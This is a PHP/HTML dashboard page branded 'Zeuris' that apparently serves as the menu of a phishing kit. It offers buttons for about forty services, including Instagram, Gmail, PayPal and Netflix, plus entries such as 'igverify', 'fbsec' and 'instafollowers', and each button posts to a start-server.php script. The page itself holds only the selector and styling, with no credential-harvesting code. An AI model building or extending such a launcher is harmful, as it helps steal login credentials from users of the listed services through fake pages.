<?php
// Start PHP session for server tracking (optional)
session_start();

// List of platforms (replace/add as needed)
$platforms = [
    'instagram', 'facebook', 'telegram', 'twitter', 'ajio', 'googlenew', 'Reddit', 'netflix', 'steam', 'amazon',
    'googlepoll', 'telegram', 'airtelsim', 'gmail', 'ola', 'apple', 'igverify', 'outlook', 'twitter', 'clashofclans',
    'paypal', 'wifi', 'facebook', 'playstation', 'wordpress', 'fbpoll', 'instafollowers', 'pubg', 'xbox', 'fbsec', 'shopify',
    'yahoo','freefire','jiorouter','snapchat','github','linkedin','youtube','socialclub',
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Social Media Dashboard</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            background-color: #002b36;
            color: #93a1a1;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
        }

        .container {
            text-align: center;
            margin: 20px auto;
            padding: 20px;
        }

        .logo {
            margin-bottom: 20px;
        }

        .logo img {
            max-width: 150px;
        }

        h1 {
            font-size: 28px;
            color: #2aa198;
            text-shadow: 0 0 10px #2aa198;
        }

        .buttons {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px;
            margin-top: 20px;
        }

        button.btn {
            padding: 10px 20px;
            font-size: 14px;
            color: #002b36;
            background-color: #2aa198;
            border: 2px solid #2aa198;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 0 5px #2aa198;
        }

        button.btn:hover {
            background-color: #002b36;
            color: #2aa198;
            border-color: #93a1a1;
            box-shadow: 0 0 10px #93a1a1;
        }

        @media (max-width: 768px) {
            button.btn {
                font-size: 12px;
                padding: 8px 16px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="zeuris.png" alt="Logo">
        </div>
      <center> <h1>Zeuris</h1></center>
        <h2>Choose a Social Media Platform</h2>
        <div class="buttons">
            <?php foreach ($platforms as $platform): ?>
                <form action="start-server.php" method="POST" style="margin: 0;">
                    <button class="btn" type="submit" name="platform" value="<?php echo strtolower($platform); ?>">
                        <?php echo htmlspecialchars($platform); ?>
                    </button>
                </form>
            <?php endforeach; ?>
        </div>
    </div>
</body>
</html>
